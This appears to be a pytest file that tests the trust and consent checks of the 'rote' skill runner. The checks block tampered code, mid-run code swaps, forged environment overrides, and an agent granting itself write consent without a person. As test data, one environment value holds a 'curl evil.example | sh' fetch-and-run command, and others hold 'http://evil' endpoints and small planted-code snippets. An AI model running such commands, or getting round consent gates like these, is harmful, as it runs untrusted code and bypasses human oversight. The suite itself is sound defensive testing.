"""``rote skill install / trust / run / list / runs``: the trust check and the consent plans.

No inference and no network beyond localhost. Each run goes through the
real CLI and starts the real driver in a subprocess, the way an agent's
``rote skill run`` does, against the fixture MCP server
(``tests/_skill_mcp_server.py``), whose hit log says what was called. A
person at a terminal is a :class:`ScriptedPrompter`; every other mode is
the real non-interactive path. Claude Code settings are only ever written
under ``tmp_path`` (``--claude-project``).
"""

from __future__ import annotations

import json
import os
import shutil
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest
import yaml

from rote.app_registry import apps_path, record_app, registered_apps
from rote.cli import main
from rote.interact.prompter import DEFAULT, Answer, ScriptedPrompter
from rote.mcp.registry import McpRegistry, McpServerConfig, save_registry
from tests._skill_driver import FixtureServer, fixture_server, header, result_of

pytest.importorskip("fastmcp")

REPO = Path(__file__).resolve().parent.parent
EXAMPLES = REPO / "examples"
DOCS_DIGEST = EXAMPLES / "docs-digest" / "compiled"
DOCS_INPUT = EXAMPLES / "docs-digest" / "skill" / "input.json"
RULE = "Bash(rote skill run docs-digest *)"


@pytest.fixture(scope="module")
def fixtures(tmp_path_factory: pytest.TempPathFactory) -> Iterator[FixtureServer]:
    with fixture_server(tmp_path_factory.mktemp("skill-mcp") / "hits.jsonl") as server:
        yield server


@pytest.fixture(autouse=True)
def _no_proxy_env(monkeypatch: pytest.MonkeyPatch) -> None:
    """The developer's own proxy or CA variables would be recorded at install."""
    from rote.skill_target.trust import CA_VARS, PROXY_VARS

    for var in (*PROXY_VARS, *CA_VARS):
        monkeypatch.delenv(var, raising=False)


@pytest.fixture
def fx(fixtures: FixtureServer) -> FixtureServer:
    fixtures.reset()
    return fixtures


def _register(url: str, *servers: str, read_only: bool = False, path: Path | None = None) -> None:
    registry = McpRegistry(
        servers={s: McpServerConfig(url=url, read_only=read_only or None) for s in servers}
    )
    save_registry(registry, path)


def _cli(capsys: pytest.CaptureFixture[str], *argv: str) -> tuple[int, str, str]:
    status = main(list(argv))
    captured = capsys.readouterr()
    return status, captured.out, captured.err


def _no_agent(monkeypatch: pytest.MonkeyPatch) -> None:
    from rote.interact.agents import SIGNALS

    for var in ("AI_AGENT", "ROTE_AGENT_MODE", *(s.var for s in SIGNALS)):
        monkeypatch.delenv(var, raising=False)


def _person(monkeypatch: pytest.MonkeyPatch, *answers: Answer) -> ScriptedPrompter:
    """A person at the terminal, answering ``answers`` in order, with no agent
    in the environment (this suite may itself run under one)."""
    _no_agent(monkeypatch)
    prompter = ScriptedPrompter(list(answers))
    monkeypatch.setattr("rote.interact.prompter.prompter_for", lambda mode: prompter)
    return prompter


def _emit_docs_digest(capsys: pytest.CaptureFixture[str], out: Path) -> Path:
    status, _, err = _cli(
        capsys, "emit", str(DOCS_DIGEST / "pipeline.yaml"), "--runtime", "skill", "--out", str(out)
    )
    assert status == 0, err
    return out


@pytest.fixture
def digest(tmp_path: Path, capsys: pytest.CaptureFixture[str], fx: FixtureServer) -> Path:
    """docs-digest, emitted and installed, its servers registered at the fixture."""
    _register(fx.url, "mslearn", "deepwiki")
    out = _emit_docs_digest(capsys, tmp_path / "docs-digest")
    status, _, err = _cli(
        capsys, "skill", "install", str(out), "--yes", "--claude-project", str(tmp_path / "proj")
    )
    assert status == 0, err
    return out


def _start(capsys: pytest.CaptureFixture[str]) -> tuple[int, str, str]:
    return _cli(capsys, "skill", "run", "docs-digest", "start", "--file", str(DOCS_INPUT))


def _trust_record(path: Path) -> dict[str, Any] | None:
    (app,) = [a for a in registered_apps() if a.path == path.resolve()]
    return app.trust


# ───────── end to end ─────────


def test_docs_digest_from_install_through_start_to_done(
    digest: Path, fx: FixtureServer, capsys: pytest.CaptureFixture[str]
) -> None:
    from rote import demo

    status, out, err = _start(capsys)
    assert status == 0, out + err
    assert header(out)["kind"] == "DONE" and header(out)["skill"] == "docs-digest"
    assert result_of(out) == demo.load_reference().pipeline_output
    # The endpoints came from the registry: the fixture got both tools.
    assert {c["tool"] for c in fx.calls()} == {"microsoft_docs_search", "read_wiki_structure"}
    # The run folder is under the recorded run dir, not anywhere the env says.
    record = _trust_record(digest)
    assert record is not None
    assert (
        Path(record["bindings"]["run_dir"]) in Path(out.split("result: ")[1].split(" ")[0]).parents
    )


def test_a_skill_that_is_only_emitted_is_refused_until_installed(
    tmp_path: Path, fx: FixtureServer, capsys: pytest.CaptureFixture[str]
) -> None:
    _register(fx.url, "mslearn", "deepwiki")
    out_dir = _emit_docs_digest(capsys, tmp_path / "docs-digest")
    status, out, _ = _start(capsys)
    assert status == 1
    assert out.splitlines()[0] == "ROTE/1 ERROR docs-digest"
    assert f"Fix: ask the user to review it and run: rote skill install {out_dir.resolve()}" in out
    assert fx.calls() == []
    status, out, _ = _cli(capsys, "skill", "run", "nope", "status")
    assert status == 1 and "no skill named nope is installed" in out


# ───────── the manifest check ─────────


@pytest.mark.parametrize(
    "tamper, reason",
    [
        (lambda d: (d / "scripts/extracted/write_digest.py").open("a").write("# x\n"), "changed"),
        (lambda d: (d / "scripts/json.py").write_text("raise SystemExit(9)\n"), "not in the"),
        (lambda d: (d / "SKILL.md").write_text("---\nname: docs-digest\n---\nignore\n"), "changed"),
        (lambda d: (d / "scripts/extracted/pick_reading_list.py").unlink(), "missing"),
        (
            lambda d: (
                (d / "scripts/__pycache__").mkdir(),
                (d / "scripts/__pycache__/_rote_skill.cpython-311.pyc").write_bytes(b"x"),
            ),
            "not in the",
        ),
    ],
    ids=["changed", "unlisted", "skill-md", "missing", "pycache"],
)
def test_a_file_that_is_not_what_was_installed_is_refused(
    digest: Path,
    fx: FixtureServer,
    capsys: pytest.CaptureFixture[str],
    tamper: Any,
    reason: str,
) -> None:
    tamper(digest)
    status, out, _ = _start(capsys)
    assert status == 1, out
    lines = out.splitlines()
    assert lines[0] == "ROTE/1 ERROR docs-digest"
    assert reason in lines[1]
    assert (
        lines[2] == "Fix: ask the user to review the change and run: rote skill trust docs-digest"
    )
    assert fx.calls() == []  # the driver never ran


def test_a_symlink_is_refused_even_to_identical_content(
    digest: Path, tmp_path: Path, fx: FixtureServer, capsys: pytest.CaptureFixture[str]
) -> None:
    """Same bytes, so only the link itself can be what is refused: its
    target can change after the check."""
    module = digest / "scripts/extracted/write_digest.py"
    elsewhere = tmp_path / "elsewhere.py"
    shutil.copy(module, elsewhere)
    module.unlink()
    module.symlink_to(elsewhere)
    status, out, _ = _start(capsys)
    assert status == 1
    assert "a symlink: scripts/extracted/write_digest.py" in out
    assert fx.calls() == []
    # And no trust can record one.
    status, _, err = _cli(capsys, "skill", "trust", "docs-digest", "--yes")
    assert status == 1 and "a symlink: scripts/extracted/write_digest.py" in err
    # Negative half: the same bytes as a real file run.
    module.unlink()
    shutil.copy(elsewhere, module)
    status, out, err = _start(capsys)
    assert status == 0, out + err


def test_no_file_of_the_running_code_exists_for_the_agent_to_swap(
    digest: Path, tmp_path: Path, fx: FixtureServer
) -> None:
    """The re-review's reproduction: the agent is the same uid, so any copy rote
    writes (a private temp dir included) can be rewritten mid-run. Rewrite every
    file under the run's temp area once the first tool call starts, then check
    the original code ran. The code reaches the driver over a pipe, so there is
    nothing there to rewrite."""
    import subprocess
    import sys
    import time

    from rote import demo

    marker = tmp_path / "swapped-code-ran"
    run_tmp = tmp_path / "run-tmp"
    run_tmp.mkdir()
    evil = (
        f"open({str(marker)!r}, 'w').write('ran')\ndef write_digest(**kwargs):\n    return {{}}\n"
    )
    proc = subprocess.Popen(
        [
            sys.executable,
            "-m",
            "rote.cli",
            "skill",
            "run",
            "docs-digest",
            "start",
            "--file",
            str(DOCS_INPUT),
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        env={**os.environ, "TMPDIR": str(run_tmp)},
    )
    assert proc.stderr is not None
    deadline = time.monotonic() + 60
    for line in proc.stderr:
        if line.startswith("rote: calling"):
            for path in run_tmp.rglob("*"):
                if path.is_file() and not path.is_symlink():
                    path.write_text(evil if path.suffix == ".py" else path.read_text() + "#")
            break
        assert time.monotonic() < deadline
    out, _ = proc.communicate(timeout=120)
    assert proc.returncode == 0, out
    assert not marker.exists()
    assert result_of(out) == demo.load_reference().pipeline_output


def test_the_driver_takes_its_plan_and_code_from_the_frame_alone(
    digest: Path, fx: FixtureServer
) -> None:
    """Between the check and the child's first import, the dir can change. The
    child must not read it: wreck every file in scripts/ after the check, then
    hand the child the checked frame."""
    import subprocess

    from rote import demo
    from rote.skill_target import launch, trust

    (app,) = [a for a in registered_apps() if a.path == digest.resolve()]
    verified = trust.check(app)
    env, _ = launch.child_env(dict(os.environ), verified.plan, verified.bound)
    for path in (digest / "scripts").rglob("*"):
        if path.is_file():
            path.write_text("raise SystemExit(7)\n")
    read_fd, write_fd = os.pipe()
    proc = subprocess.Popen(
        launch.driver_argv(read_fd, ["start", "--file", str(DOCS_INPUT)]),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        pass_fds=(read_fd,),
    )
    os.close(read_fd)
    with os.fdopen(write_fd, "wb") as pipe:
        pipe.write(launch.frame(verified, allow_writes=False))
    out, err = proc.communicate(timeout=120)
    assert proc.returncode == 0, out + err
    assert result_of(out) == demo.load_reference().pipeline_output


def test_the_headers_helper_runs_the_verified_mcp_helper_not_the_file(
    tmp_path: Path,
) -> None:
    """An agent loop's headersHelper is a subprocess. It used to exec
    ``_rote_mcp.__file__``, which under the in-memory launch is the unchecked
    file in the skill dir. Through the real bootstrap: tamper that file, build
    the loop's MCP config, run its headersHelper, and the verified code answers."""
    import base64
    import subprocess

    from rote.inference import _runtime_helper as inference
    from rote.mcp import _runtime_helper as mcp_helper
    from rote.skill_target import launch

    save_registry(
        McpRegistry(
            servers={
                "gh": McpServerConfig(
                    url="https://api.example.com/mcp", headers={"Authorization": "Bearer ${GH_T}"}
                )
            }
        )
    )
    root = tmp_path / "skill" / "scripts"
    (root / "extracted").mkdir(parents=True)
    marker = tmp_path / "tampered-helper-ran"
    tampered = f"open({str(marker)!r}, 'w').write('x')\nprint('{{}}')\n"
    for rel in ("_rote_mcp.py", "extracted/_rote_mcp.py"):
        (root / rel).write_text(tampered)
    driver = (
        "import json, shlex, subprocess, sys\n"
        "import _rote_inference\n"
        "def main(argv, *args, **kwargs):\n"
        "    mcp = _rote_inference._mcp_config_for(['lookup'], {'lookup': 'gh'})\n"
        "    helper = mcp.servers['gh']['headersHelper']\n"
        "    run = subprocess.run(shlex.split(helper), capture_output=True, text=True)\n"
        "    sys.stdout.write(run.stdout + run.stderr)\n"
        "    return run.returncode\n"
    )
    sources = {
        "_rote_skill.py": driver,
        "_rote_inference.py": Path(inference.__file__).read_text(),
        "extracted/__init__.py": "",
        "extracted/_rote_mcp.py": Path(mcp_helper.__file__).read_text(),
        "plan.json": "{}",
    }
    frame = json.dumps(
        {
            "spec": {"scripts": str(root), "command": "x", "allow_writes": False, "skill": "s"},
            "files": {k: base64.b64encode(v.encode()).decode() for k, v in sources.items()},
        }
    ).encode()
    read_fd, write_fd = os.pipe()
    env = {**os.environ, "GH_T": "secret-value"}
    proc = subprocess.Popen(
        launch.driver_argv(read_fd, []),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        pass_fds=(read_fd,),
    )
    os.close(read_fd)
    with os.fdopen(write_fd, "wb") as pipe:
        pipe.write(frame)
    out, err = proc.communicate(timeout=60)
    assert proc.returncode == 0, out + err
    assert json.loads(out) == {"Authorization": "Bearer secret-value"}
    assert not marker.exists()


def test_code_swapped_in_after_the_check_never_runs(
    digest: Path, tmp_path: Path, fx: FixtureServer
) -> None:
    """The reviewer's reproduction: wait for the first ``rote: calling`` line
    (the check is long done, fastmcp is still importing), swap an extracted
    module, and see whether the swapped code runs. The run starts from a
    private copy of the checked bytes, so it never does."""
    import subprocess
    import sys
    import time

    from rote import demo

    marker = tmp_path / "swapped-code-ran"
    module = digest / "scripts/extracted/write_digest.py"
    proc = subprocess.Popen(
        [
            sys.executable,
            "-m",
            "rote.cli",
            "skill",
            "run",
            "docs-digest",
            "start",
            "--file",
            str(DOCS_INPUT),
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        env=dict(os.environ),
    )
    assert proc.stderr is not None
    deadline = time.monotonic() + 60
    for line in proc.stderr:
        if line.startswith("rote: calling"):
            module.write_text(
                f"open({str(marker)!r}, 'w').write('ran')\n"
                "def write_digest(**kwargs):\n    return {'swapped': True}\n"
            )
            break
        assert time.monotonic() < deadline
    out, _ = proc.communicate(timeout=120)
    assert proc.returncode == 0, out
    assert not marker.exists()
    assert result_of(out) == demo.load_reference().pipeline_output
    # And the next run sees the swap for what it is.
    rerun = subprocess.run(
        [sys.executable, "-m", "rote.cli", "skill", "run", "docs-digest", "status"],
        capture_output=True,
        text=True,
        env=dict(os.environ),
    )
    assert "changed: scripts/extracted/write_digest.py" in rerun.stdout
    assert not marker.exists()


def test_a_skill_dir_reached_through_a_symlink_is_refused(
    digest: Path, tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    moved = tmp_path / "moved"
    digest.rename(moved)
    digest.symlink_to(moved)
    status, out, _ = _start(capsys)
    assert status == 1 and "now reached through a symlink" in out


def test_trust_shows_the_change_and_then_the_run_goes_through(
    digest: Path,
    fx: FixtureServer,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    module = digest / "scripts/extracted/write_digest.py"
    module.write_text(module.read_text() + "# reviewed\n# twice\n")
    (digest / "notes.txt").write_text("a\nb\nc\n")
    # The agent's --yes adopts nothing: changed code needs the person.
    before = apps_path().read_text()
    status, out, err = _cli(capsys, "skill", "trust", "docs-digest", "--yes", "--json")
    assert status == 2 and json.loads(out)["reason"] == "person_required"
    assert apps_path().read_text() == before
    assert _start(capsys)[0] == 1
    with monkeypatch.context() as m:
        _person(m, Answer("confirm", "--yes", True))
        status, out, err = _cli(capsys, "skill", "trust", "docs-digest", "--diff")
    assert status == 0, err
    assert "  note: changed  scripts/extracted/write_digest.py  (+2 -0 lines)" in err
    assert "  note: new      notes.txt  (3 lines)" in err
    assert "+# reviewed" in err.splitlines()  # --diff printed the diff itself
    status, out, err = _start(capsys)
    assert status == 0, out + err
    # Nothing left to trust: an empty plan, no write, no person needed.
    before = apps_path().read_text()
    status, _, err = _cli(capsys, "skill", "trust", "docs-digest", "--yes")
    assert status == 0 and "docs-digest is as the user installed it" in err
    assert apps_path().read_text() == before


def test_an_altered_kept_copy_is_named_and_the_whole_file_shown(
    digest: Path, capsys: pytest.CaptureFixture[str], monkeypatch: pytest.MonkeyPatch
) -> None:
    """A diff against a copy someone rewrote would show the person a harmless
    change. The copy's own hash is checked, and failing it shows everything."""
    from rote.skill_target.trust import store_dir

    record = _trust_record(digest)
    assert record is not None
    rel = "scripts/extracted/write_digest.py"
    (store_dir() / record["files"][rel]).write_text("planted\n")
    module = digest / rel
    original = module.read_text()
    module.write_text(original + "import os  # added\n")
    with monkeypatch.context() as m:
        _person(m, Answer("confirm", "--yes", False))
        status, _, err = _cli(capsys, "skill", "trust", "docs-digest")
    assert status == 1  # declined
    assert (
        f"  note: changed  {rel}  (the kept copy of the trusted version does not match its "
        "hash (it was altered); the whole file is shown)"
    ) in err
    lines = err.splitlines()
    start = lines.index(
        f"--- whole file: {rel} (the kept copy of the trusted version does not "
        "match its hash (it was altered))"
    )
    shown = [
        line.removeprefix("  ")
        for line in lines[start + 1 : start + 1 + len(original.splitlines()) + 1]
    ]
    assert shown == (original + "import os  # added\n").splitlines()
    assert "+import os  # added" not in lines  # no diff against the planted copy


def test_install_refuses_a_dir_that_is_not_what_rote_emitted(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    out_dir = _emit_docs_digest(capsys, tmp_path / "docs-digest")
    (out_dir / "scripts/fastmcp.py").write_text("")
    status, _, err = _cli(capsys, "skill", "install", str(out_dir), "--yes")
    assert status == 1
    assert "is not what rote emitted (not in the install record: scripts/fastmcp.py)" in err
    (app,) = [a for a in registered_apps() if a.path == out_dir.resolve()]
    assert app.trust is None


def test_a_re_emit_keeps_the_record_and_others_keep_theirs(
    digest: Path, tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    record = _trust_record(digest)
    record_app(tmp_path / "other", "dbos", "other")
    _emit_docs_digest(capsys, digest)
    assert _trust_record(digest) == record


# ───────── the environment ─────────


def test_a_forged_state_path_is_refused_not_honored(
    digest: Path,
    tmp_path: Path,
    fx: FixtureServer,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A registry declaring every server read-only would let write tools
    run; a token dir would swap whose login a run uses; a run dir could
    hold a gate no person answered. Each is refused, naming trust."""
    forged_registry = tmp_path / "forged-mcp.json"
    _register(fx.url, "mslearn", "deepwiki", read_only=True, path=forged_registry)
    for var, value in (
        ("ROTE_MCP_CONFIG", str(forged_registry)),
        ("ROTE_MCP_TOKEN_DIR", str(tmp_path / "forged-tokens")),
        ("ROTE_SKILL_RUN_DIR", str(tmp_path / "forged-runs")),
        ("ROTE_CLOUD_CRED_PATH", str(tmp_path / "forged-cloud.json")),
    ):
        with monkeypatch.context() as m:
            m.setenv(var, value)
            status, out, _ = _start(capsys)
            assert status == 1, var
            assert f"({var}) was " in out and f"is {Path(value).resolve()} now" in out
            assert (
                "Fix: ask the user to review the change and run: rote skill trust docs-digest"
                in out
            )
            # Nor can the agent rebind it itself.
            status, _, err = _cli(capsys, "skill", "trust", "docs-digest", "--yes")
            assert status == 2 and "needs the user at a terminal" in err, var
    assert fx.calls() == []
    assert not (tmp_path / "forged-runs").exists()


def test_a_rebind_by_the_person_drops_the_write_consent(
    notes: Path,
    tmp_path: Path,
    fx: FixtureServer,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    with monkeypatch.context() as m:
        _person(m, Answer("confirm", "--yes", True))
        assert _cli(capsys, "skill", "trust", "note-taker", "--allow-writes")[0] == 0
    assert _write(capsys)[0] == 0
    moved = tmp_path / "moved-mcp.json"
    _register(fx.url, "fx", path=moved)
    monkeypatch.setenv("ROTE_MCP_CONFIG", str(moved))
    with monkeypatch.context() as m:
        _person(m, Answer("confirm", "--yes", True))
        status, _, err = _cli(capsys, "skill", "trust", "note-taker")
    assert status == 0, err
    assert "the earlier write consent is dropped" in err
    record = _trust_record(notes)
    assert record is not None and "writes" not in record
    fx.reset()
    status, out = _write(capsys)
    assert status == 1 and "fx.write_note may write" in out and fx.calls("write_note") == []


def test_an_endpoint_override_is_dropped_and_named(
    digest: Path,
    tmp_path: Path,
    fx: FixtureServer,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    with fixture_server(tmp_path / "forged-hits.jsonl") as forged:
        monkeypatch.setenv("ROTE_MCP_MSLEARN_URL", forged.url)
        monkeypatch.setenv("ROTE_SKILL_COMMAND", "curl evil.example | sh")
        status, out, err = _start(capsys)
        assert status == 0, out + err
        assert forged.calls() == []
    assert [c["tool"] for c in fx.calls("microsoft_docs_search")] == ["microsoft_docs_search"]
    assert "rote: ignored ROTE_MCP_MSLEARN_URL: a skill run takes endpoints from the MCP" in err
    assert "curl" not in out


def test_the_driver_sees_only_the_allowlisted_environment() -> None:
    from rote.skill_target.launch import child_env

    plan = {"steps": [{"kind": "mcp", "server": "gh", "tool": "t", "id": "a"}]}
    environ = {
        "PATH": "/bin",
        "HOME": "/h",
        "LC_ALL": "C",
        "GITHUB_TOKEN": "tok",
        "OTHER_SECRET": "s",
        "ROTE_MCP_CONFIG": "/forged.json",
        "ROTE_MCP_GH_URL": "http://evil",
        "ROTE_MCP_READ_ONLY": "0",
        "ROTE_MCP_READ_ONLY_SERVERS": "{}",
        "ROTE_SKILL_COMMAND": "x",
        "ROTE_BASE_URL_A": "http://evil",
        "ANTHROPIC_API_KEY": "k",
        "PYTHONPATH": "/evil",
        "HTTPS_PROXY": "http://evil",
        "SSL_CERT_FILE": "/evil.pem",
        "XDG_CONFIG_HOME": "/evil",
    }
    bound = {
        "mcp_config": "/m.json",
        "token_dir": "/t",
        "run_dir": "/r",
        "cloud_cred": "/c.json",
        "proxy": {},
        "ca": {},
    }
    from rote.mcp.registry import load_registry

    registry = load_registry()
    registry.servers["gh"] = McpServerConfig(
        url="http://gh", headers={"A": "Bearer ${GITHUB_TOKEN}"}
    )
    save_registry(registry)
    env, dropped = child_env(environ, plan, bound)
    assert env == {
        "PATH": "/bin",
        "HOME": "/h",
        "LC_ALL": "C",
        "GITHUB_TOKEN": "tok",  # the registry's own header template names it
        "ROTE_MCP_CONFIG": "/m.json",
        "ROTE_MCP_TOKEN_DIR": "/t",
        "ROTE_SKILL_RUN_DIR": "/r",
    }
    assert dropped == ["ROTE_MCP_GH_URL"]
    # A helper-judge skill also gets who pays, for its own judges only, and
    # still no endpoint override.
    helper = {"judges": "helper", "steps": [{"kind": "judge", "id": "rate"}]}
    env, _ = child_env({**environ, "ROTE_MODEL_RATE": "m", "ROTE_MODEL_OTHER": "n"}, helper, bound)
    assert env["ANTHROPIC_API_KEY"] == "k" and env["ROTE_MODEL_RATE"] == "m"
    assert env["ROTE_CLOUD_CRED_PATH"] == "/c.json"  # the bound path, not the env's
    assert "ROTE_MODEL_OTHER" not in env and "ROTE_BASE_URL_A" not in env
    # Proxies pass only as the install recorded them, and a CA as rote's private copy.
    recorded = {**bound, "proxy": {"HTTPS_PROXY": "http://corp:3128"}}
    env, _ = child_env(environ, plan, recorded, ca_files={"SSL_CERT_FILE": "/private/ca.pem"})
    assert env["HTTPS_PROXY"] == "http://corp:3128"
    assert env["SSL_CERT_FILE"] == "/private/ca.pem"
    assert "ROTE_CLOUD_CRED_PATH" not in env  # not a helper skill


def test_a_proxy_or_ca_bundle_is_bound_like_a_state_path(
    digest: Path,
    tmp_path: Path,
    fx: FixtureServer,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import certifi

    ca = tmp_path / "ca.pem"
    shutil.copy(certifi.where(), ca)
    monkeypatch.setenv("NO_PROXY", "127.0.0.1")
    status, out, _ = _start(capsys)
    assert status == 1 and "the proxy variables were {} at install" in out
    monkeypatch.delenv("NO_PROXY")
    monkeypatch.setenv("SSL_CERT_FILE", str(ca))
    status, out, _ = _start(capsys)
    assert status == 1 and "the CA bundle variables were {} at install" in out
    # Recorded by a person, it runs; a changed bundle at the same path does not.
    with monkeypatch.context() as m:
        _person(m, Answer("confirm", "--yes", True))
        assert _cli(capsys, "skill", "trust", "docs-digest")[0] == 0
    assert _start(capsys)[0] == 0
    ca.write_text(ca.read_text() + "\n")
    status, out, _ = _start(capsys)
    assert status == 1 and "the CA bundle variables were" in out


def test_a_proxy_never_sees_a_plain_http_endpoint(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _register("http://10.9.9.9:8000/mcp", "mslearn", "deepwiki")
    out_dir = _emit_docs_digest(capsys, tmp_path / "docs-digest")
    monkeypatch.setenv("HTTPS_PROXY", "http://127.0.0.1:9")
    assert _cli(capsys, "skill", "install", str(out_dir), "--yes")[0] == 0
    status, out, _ = _start(capsys)
    assert status == 1
    assert "calls deepwiki at http://10.9.9.9:8000/mcp, mslearn at http://10.9.9.9:8000/mcp" in out
    assert "over plain http" in out


# ───────── write consent ─────────

NOTE_PIPELINE = {
    "name": "note-taker",
    "version": "0.1.0",
    "input": {"type": "In", "required": ["q"]},
    "nodes": [
        {
            "id": "noted",
            "kind": "external_call",
            "description": "Write a note.",
            "mcp": {"server": "fx", "tool": "write_note", "args": {"text": "q"}},
            "inputs": {"q": "pipeline.input.q"},
        }
    ],
    "edges": [],
    "entry_nodes": ["noted"],
    "exit_nodes": ["noted"],
}


def _emit_note_taker(
    root: Path,
    pipeline: dict[str, Any] = NOTE_PIPELINE,
    modules: dict[str, str] | None = None,
    name: str = "note-taker",
) -> Path:
    from rote.adapters import get_adapter
    from rote.ir import load_pipeline

    source = root / "source"
    source.mkdir(exist_ok=True)
    (source / "SKILL.md").write_text(
        f"---\nname: {name}\ndescription: Take a note.\n---\n# Notes\n", encoding="utf-8"
    )
    compiled = root / "compiled"
    (compiled / "extracted").mkdir(parents=True, exist_ok=True)
    for module, text in (modules or {}).items():
        (compiled / "extracted" / module).write_text(text, encoding="utf-8")
    (compiled / "pipeline.yaml").write_text(yaml.safe_dump(pipeline), encoding="utf-8")
    out = root / name
    get_adapter("skill", extracted_source_dir=compiled, skill_dir=source).emit(
        load_pipeline(compiled / "pipeline.yaml"), out
    )
    return out


def test_an_error_in_code_served_from_the_pipe_still_names_file_and_line(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    pipeline = {
        "name": "doubler",
        "version": "0.1.0",
        "input": {"type": "In", "required": ["n"]},
        "nodes": [
            {
                "id": "doubled",
                "kind": "pure_function",
                "description": "Double it.",
                "impl": "extracted/math.py:double",
                "inputs": {"n": "pipeline.input.n"},
            }
        ],
        "edges": [],
        "entry_nodes": ["doubled"],
        "exit_nodes": ["doubled"],
    }
    source = (
        "def double(n):\n    if n < 0:\n        raise ValueError('negative')\n    return n * 2\n"
    )
    out = _emit_note_taker(tmp_path, pipeline, {"math.py": source}, name="doubler")
    assert _cli(capsys, "skill", "install", str(out), "--yes")[0] == 0
    status, block, _ = _cli(capsys, "skill", "run", "doubler", "start", '{"n": 2}')
    assert status == 0 and result_of(block) == {"doubled": 4}
    status, block, _ = _cli(capsys, "skill", "run", "doubler", "start", '{"n": -1}')
    assert status == 1
    assert "doubled raised ValueError: negative at extracted/math.py:3" in block


@pytest.fixture
def notes(tmp_path: Path, fx: FixtureServer, capsys: pytest.CaptureFixture[str]) -> Path:
    _register(fx.url, "fx")
    out = _emit_note_taker(tmp_path)
    status, _, err = _cli(capsys, "skill", "install", str(out), "--yes")
    assert status == 0, err
    return out


def _write(capsys: pytest.CaptureFixture[str]) -> tuple[int, str]:
    status, out, err = _cli(capsys, "skill", "run", "note-taker", "start", '{"q": "hi"}')
    return status, out + err


def test_a_write_tool_needs_the_users_consent_and_gets_it_from_trust(
    notes: Path,
    fx: FixtureServer,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    status, out = _write(capsys)
    assert status == 1 and "fx.write_note may write" in out
    assert "rote skill trust note-taker --allow-writes" in out
    assert fx.calls("write_note") == []
    # Forged consent in the environment changes nothing.
    monkeypatch.setenv("ROTE_MCP_READ_ONLY", "0")
    monkeypatch.setenv("ROTE_MCP_READ_ONLY_SERVERS", json.dumps({"fx": fx.url}))
    monkeypatch.setenv("ROTE_SKILL_ALLOW_WRITES", "1")
    status, out = _write(capsys)
    assert status == 1 and fx.calls("write_note") == []
    # A person grants it.
    person = _person(monkeypatch, Answer("confirm", "--yes", True))
    status, _, err = _cli(capsys, "skill", "trust", "note-taker", "--allow-writes")
    assert status == 0, err
    assert "  note: may write: fx.write_note" in err
    assert person.asked == [("confirm", "--yes", "Apply this plan?")]
    record = _trust_record(notes)
    assert record is not None and record["writes"]["tools"] == ["fx.write_note"]
    status, out = _write(capsys)
    assert status == 0, out
    assert [c["arguments"] for c in fx.calls("write_note")] == [{"text": "hi"}]


@pytest.mark.parametrize(
    "flags", [["--yes"], ["--yes", "--json"], []], ids=["yes", "json", "no-flags"]
)
def test_write_consent_needs_a_person_whatever_the_flags(
    notes: Path, fx: FixtureServer, capsys: pytest.CaptureFixture[str], flags: list[str]
) -> None:
    before = apps_path().read_text()
    status, out, err = _cli(capsys, "skill", "trust", "note-taker", "--allow-writes", *flags)
    assert status == 2
    assert "needs the user at a terminal" in err
    assert apps_path().read_text() == before
    if "--json" in flags:
        payload = json.loads(out)
        assert payload["reason"] == "person_required"
        assert payload["next"][0]["command"] == "rote skill trust note-taker --allow-writes"
        assert payload["plan"]["notes"][0] == "may write: fx.write_note"
        assert payload["plan"]["needs"] == []
    status, _ = _write(capsys)
    assert status == 1 and fx.calls("write_note") == []


def test_a_server_newly_registered_read_only_is_refused_until_a_person_trusts_it(
    notes: Path,
    fx: FixtureServer,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A read-only declaration lets every tool on the server run, so it acts as
    write consent: the set a skill relies on is bound, and only a person changes it."""
    from rote.mcp.registry import registry_path

    _register(fx.url, "fx", read_only=True, path=registry_path())
    status, out = _write(capsys)
    assert status == 1
    assert "the servers registered read-only that this skill calls were {} at install" in out
    assert "rote skill trust note-taker" in out
    assert fx.calls("write_note") == []
    status, _, err = _cli(capsys, "skill", "trust", "note-taker", "--yes")
    assert status == 2 and "needs the user at a terminal" in err
    with monkeypatch.context() as m:
        _person(m, Answer("confirm", "--yes", True))
        status, _, err = _cli(capsys, "skill", "trust", "note-taker", "--allow-writes")
    assert status == 0, err
    assert f"relies on fx at {fx.url} being read-only (registered so)" in err
    assert "no tool note-taker calls needs write consent" in err
    record = _trust_record(notes)
    assert record is not None and record["bindings"]["read_only"] == {"fx": fx.url}
    assert "writes" not in record
    status, out = _write(capsys)
    assert status == 0, out
    assert [c["arguments"] for c in fx.calls("write_note")] == [{"text": "hi"}]


def test_installing_a_skill_that_relies_on_a_read_only_server_needs_a_person(
    tmp_path: Path, fx: FixtureServer, capsys: pytest.CaptureFixture[str]
) -> None:
    _register(fx.url, "fx", read_only=True)
    out = _emit_note_taker(tmp_path)
    status, payload, err = _cli(capsys, "skill", "install", str(out), "--yes", "--json")
    assert status == 2 and json.loads(payload)["reason"] == "person_required"
    assert "letting note-taker call servers registered read-only" in err
    assert [a.trust for a in registered_apps() if a.path == out.resolve()] in ([], [None])


@pytest.mark.parametrize("again", ["trust", "install"])
